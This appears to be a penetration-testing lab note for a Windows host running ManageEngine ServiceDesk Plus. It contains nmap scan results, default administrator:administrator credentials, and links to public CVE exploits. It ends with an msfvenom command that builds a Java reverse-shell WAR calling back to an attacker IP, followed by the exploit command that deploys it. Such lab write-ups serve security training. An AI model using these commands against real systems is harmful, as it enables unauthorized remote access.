_____

>[!INFO]
> IP=192.168.209.43
> Windows

# Nmap
| PORT   | STATE | SERVICE        |
|--------|-------|----------------|
| 135/tcp| open  | msrpc          |
| 139/tcp| open  | netbios-ssn    |
| 445/tcp| open  | microsoft-ds   |
|3389/tcp| open  | ms-wbt-server  |
|8080/tcp| open  | http-proxy     |


```python
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
|_http-title: ManageEngine ServiceDesk Plus
Service Info: Host: HELPDESK; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: HELPDESK
|   NetBIOS computer name: HELPDESK\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-05T12:50:05-08:00
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: HELPDESK, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ba:ac:55 (VMware)
|_clock-skew: mean: -3h19m50s, deviation: 4h37m07s, median: -5h59m50s
| smb2-time: 
|   date: 2024-02-05T20:50:05
|_  start_date: 2024-02-05T20:47:49
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

# 8080 - http

ManageEngine ServiceDesk Plus

**administrator**:**administrator**

https://github.com/horizon3ai/CVE-2021-44077


https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py

```bash
msfvenom -p java/shell_reverse_tcp LHOST=192.168.45.182 LPORT=4444 -f war > shell.war
python3 cve.py $IP 8080 administrator administrator shell.war
```
